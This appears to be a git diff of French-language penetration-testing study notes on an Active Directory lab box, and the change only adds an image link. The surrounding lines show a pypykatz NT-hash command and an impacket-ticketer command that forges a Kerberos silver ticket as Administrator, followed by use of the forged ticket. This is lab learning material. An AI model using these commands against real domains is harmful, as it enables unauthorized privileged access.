@@ -112,7 +112,7 @@ pypykatz crypto nt Trustno1
 ```bash
 impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -dc-ip 10.129.44.190 -domain breach.vl -user-id 500 Administrator
 ```
-![alt text]()
+![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804170018.png)
 #### 3.  Se connecter avec le ticket forger 
 ```bash
 export KRB5CCNAME=Administrator.ccache
